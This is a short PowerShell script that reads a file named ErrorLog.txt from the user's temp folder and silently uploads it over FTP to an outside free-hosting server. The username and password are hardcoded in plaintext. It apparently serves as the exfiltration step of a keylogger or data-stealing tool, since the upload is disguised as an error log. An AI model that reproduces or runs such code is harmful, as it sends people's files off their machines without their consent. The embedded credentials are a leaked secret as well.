# Config
$Username = "genera70"
$Password = "123Buttercup!"
$LocalFile = "$env:temp\ErrorLog.txt"
$RemoteFile = "ftp://generalkenobi.x10host.com/public_html/ErrorLog.txt"

# Create FTP Rquest Object
$FTPRequest = [System.Net.FtpWebRequest]::Create("$RemoteFile")
$FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
$FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
$FTPRequest.Credentials = new-object System.Net.NetworkCredential($Username, $Password)
$FTPRequest.UseBinary = $true
$FTPRequest.UsePassive = $true
# Read the File for Upload
$FileContent = gc -en byte $LocalFile
$FTPRequest.ContentLength = $FileContent.Length
# Get Stream Request by bytes
$Run = $FTPRequest.GetRequestStream()
$Run.Write($FileContent, 0, $FileContent.Length)
# Cleanup
$Run.Close()
$Run.Dispose()
